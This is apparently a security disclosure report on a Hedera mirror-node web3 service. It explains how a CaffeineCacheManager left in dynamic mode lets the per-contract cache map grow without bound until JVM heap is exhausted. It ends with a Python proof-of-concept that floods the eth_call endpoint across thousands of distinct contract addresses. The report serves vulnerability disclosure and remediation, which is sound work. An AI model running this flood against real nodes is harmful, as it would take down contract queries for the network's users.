### Title
Unbounded `CaffeineCacheManager` Internal Map Growth via Dynamic Cache Creation in `cacheManagerSlotsPerContract` Leads to JVM Heap Exhaustion DoS

### Summary
`cacheManagerSlotsPerContract()` constructs a `CaffeineCacheManager` without calling `setCacheNames()`, placing it in Spring's "dynamic" mode where `getCache(name)` creates and permanently stores a new `CaffeineCache` in an internal `ConcurrentHashMap` for every unique name. Because `findStorageBatch()` calls `cacheManagerSlotsPerContract.getCache(contractId.toString())` for every previously-unseen contract entity ID, an unprivileged attacker who issues `eth_call` requests against a large number of distinct contract addresses causes this internal map to grow without bound, eventually exhausting JVM heap memory.

### Finding Description

**Exact code path:**

`EvmConfiguration.java` lines 107–112 — the bean is created with no `setCacheNames()`:
```java
@Bean(CACHE_MANAGER_SLOTS_PER_CONTRACT)
CaffeineCacheManager cacheManagerSlotsPerContract() {
    final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
    caffeineCacheManager.setCacheSpecification(cacheProperties.getSlotsPerContract());
    // ← no setCacheNames() → dynamic mode
    return caffeineCacheManager;
}
```

`ContractStateServiceImpl.java` lines 85–87 — every cache miss on the outer `contractSlotsCache` triggers a call into the dynamic manager:
```java
private Optional<byte[]> findStorageBatch(final EntityId contractId, final byte[] key) {
    final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
            contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
```

**Root cause:**

Spring's `CaffeineCacheManager.getCache(name)` in dynamic mode stores every newly created `CaffeineCache` in an internal `ConcurrentHashMap<String, Cache> cacheMap`. This map has no size limit, no TTL, and no eviction mechanism. Once an entry is inserted it is never removed.

The outer `contractSlotsCache` (bean `CACHE_MANAGER_CONTRACT_SLOTS`) is configured with `maximumSize=3000` (`contractSlots = "expireAfterAccess=5m,maximumSize=3000,recordStats"`). When the outer cache evicts a `contractId` entry, the corresponding `CaffeineCache` object is removed from the outer cache but **remains permanently in `cacheManagerSlotsPerContract.cacheMap`**. Subsequent requests for the same evicted `contractId` call `cacheManagerSlotsPerContract.getCache(contractId.toString())` again; because the name already exists in `cacheMap`, the same object is returned (no duplicate), but for every *new* distinct `contractId` a fresh `CaffeineCache` is inserted and never freed.

**Exploit flow:**

1. Attacker sends `eth_call` to contract address `C_1` that reads at least one storage slot.
2. `findStorage(C_1, key)` is called; `contractStateCache` misses; `findStorageBatch` is entered.
3. `contractSlotsCache.get(C_1, loader)` misses the outer cache; loader executes `cacheManagerSlotsPerContract.getCache("C_1")` → new `CaffeineCache` inserted into `cacheMap`.
4. Repeat for `C_2 … C_N` with distinct addresses.
5. After 3 000 distinct addresses the outer `contractSlotsCache` begins evicting, but `cacheManagerSlotsPerContract.cacheMap` retains all N entries.
6. Each retained `CaffeineCache` wraps a Caffeine `BoundedLocalCache` configured with `maximumSize=1500, expireAfterAccess=5m`, which allocates internal data structures (write-buffer queue, striped read buffer, segment arrays). At even a conservative ~10–20 KB per instance, 100 000 entries consume 1–2 GB; at 1 000 000 entries (reachable in ~33 minutes at the default 500 req/s throttle) consumption reaches 10–20 GB.

**Why existing checks fail:**

- The gas-per-second bucket and the 500 req/s rate limiter slow the attacker but do not cap the *total* number of distinct contract IDs ever seen. The attacker simply sustains the attack over time.
- The outer `contractSlotsCache` `maximumSize=3000` bounds only the outer cache, not `cacheManagerSlotsPerContract.cacheMap`.
- `enableBatchContractSlotCaching` defaults to `true`, so the vulnerable path is active by default.
- No authentication or IP-based per-client limit is enforced at the application layer.

### Impact Explanation
Sustained heap growth leads to `OutOfMemoryError`, crashing the JVM or causing severe GC pressure that renders the mirror-node web3 service completely unresponsive. Because the mirror node is the sole EVM query endpoint for applications relying on `eth_call`/`eth_estimateGas`, a successful attack takes down all smart-contract read operations for the network's users. Recovery requires a process restart; the attack can be immediately resumed.

### Likelihood Explanation
The attack requires no credentials, no on-chain funds, and no special knowledge beyond knowing that the endpoint accepts `eth_call`. Any contract address that reads storage (extremely common on Hedera mainnet/testnet) suffices. The attacker needs only a script that cycles through distinct `to` addresses at the permitted rate. The default 500 req/s throttle means ~1.8 million distinct cache entries per hour are achievable from a single client; multiple clients multiply this. The attack is fully repeatable after a restart.

### Recommendation
1. **Call `setCacheNames()` with a fixed sentinel name** on `cacheManagerSlotsPerContract` (as every other `CaffeineCacheManager` bean in the codebase does). This disables dynamic mode and prevents unbounded `cacheMap` growth.
2. **Remove the per-contract sub-cache indirection entirely**: instead of storing a `CaffeineCache` object as a value in the outer `contractSlotsCache`, encode the `(contractId, slotKey)` pair as a composite key directly in a single bounded cache, eliminating the two-level structure.
3. If the two-level design is retained, **use a `LoadingCache<EntityId, Cache>` with a Caffeine-managed eviction listener** that explicitly calls `cacheManagerSlotsPerContract.getCache(name)` removal on eviction, or maintain the per-contract caches in a plain `ConcurrentHashMap` with a bounded Caffeine outer cache whose removal listener cleans up the inner map.

### Proof of Concept
```python
import requests, threading

TARGET = "http://<mirror-node-host>/api/v1/contracts/call"

# Pre-populate a list of distinct contract addresses that exist on the network
# and read at least one storage slot (any standard ERC-20/HTS token contract works).
CONTRACT_ADDRESSES = [
    "0x" + hex(i)[2:].zfill(40) for i in range(1, 200_001)
]

def flood(addresses):
    for addr in addresses:
        requests.post(TARGET, json={
            "to": addr,
            "data": "0x70a08231" + "0" * 64,  # balanceOf(address(0))
            "gas": 100000,
            "estimate": False,
            "block": "latest"
        })

# Spawn threads up to the 500 req/s throttle across multiple IPs if needed
threads = [threading.Thread(target=flood, args=(CONTRACT_ADDRESSES[i::8],))
           for i in range(8)]
for t in threads: t.start()
for t in threads: t.join()

# After sustained execution, monitor mirror-node JVM heap via JMX or /actuator/metrics.
# OOM or severe GC pauses will be observed as cacheManagerSlotsPerContract.cacheMap
# accumulates tens of thousands of CaffeineCache instances.
```
